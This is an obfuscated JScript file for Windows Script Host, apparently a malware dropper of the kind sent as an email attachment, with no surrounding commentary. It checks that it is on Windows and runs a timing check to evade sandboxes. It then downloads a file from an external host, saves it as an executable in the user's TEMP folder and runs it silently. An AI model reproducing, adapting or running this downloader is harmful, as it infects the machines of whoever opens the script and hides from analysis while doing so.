var _S0 = false;
var _FG = "CreateObject";
var _J = function _GI() {return WScript[_FG]("WScript"+".Shell");}(), _RS = 11;
var _UG = "MSXML2.XMLHTTP";
var _OJ = 2123213;
var _QG = 0;
function _B0(_E){_J["Run"](_E, _QG, _QG);};
function _EN(){return _UG + "";};
function _KS(_OK, _Z){_QG = _QG * 1; return _OK - _Z;};
function _S(){return _FG;};
/*@cc_on
  @if (@_win32 || @_win64)
    _S0 = true;
  @end
@*/
if (_S0)
{
var _M = "";
function _SR(){return 22;};
var _NH = 0; var _O = 0;
function _R()
{
var _GC = new this["Date"]();
var _TV = _GC["getUTCMilliseconds"]();
WScript["Sleep"](_SR());
var _GC = new this["Date"]();
var _N = _GC["getUTCMilliseconds"]();
WScript["Sleep"](_SR());
var _GC = new this["Date"]();
var _UA = _GC["getUTCMilliseconds"]();
var _NH = "_K";
_NH = _KS(_N, _TV);
var _O = "_W";
_O = _KS(_UA, _N);
_M = "open";
return _KS(_NH, _O);
}
var _HW = false;
var _Q = false;
for (var _TM = _QG; _TM < _SR() * 1; _TM++){if (_R() != _QG){
_HW = true; 
_O = "31" + 11 * _NH + _O; 
_Q = true; 
break;
}}
function _FL() {return ((_HW == true) && (_HW == _Q)) ? 1 : _QG;};
if (_HW && _FL() && _Q){
function _TZ() {return _J["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9gkoPjATAKClZSm.ex" + "e";};
 _OH = _EN();
 _R0 = WScript[_FG](_OH);
 var _MS = 1;
 while (_MS){
try {
	if (_MS == 1)
	{
		_R0[_M]("GET", "http://ru-optovik.ru/j9ssl", false);
		_R0["send"]();
		_PZ = "Sleep";
	}
	WScript[_PZ](_SR() + 120); 
	if (_R0["readystate"] < 2 * 2) continue;
	_MS = _QG;
	function _B(_VU) {var _JG = (1, 2, 3, 4, 5, _VU); return _JG;};
	_W0 = WScript[_S()]("ADODB.Stream");
	_OH = _W0;
	_OH[_M]();
	_OH["type"] = _B(1);
	_OH["write"](_R0["ResponseBody"]);
	_W0["position"] = _B(_QG);
	_OH["Save" + "ToFile"](_TZ(), 2);
	_W0["cl"+"ose"]();
	_ZC = _TZ();
	_B0(_ZC);
} catch(_WT){};
}
}
}

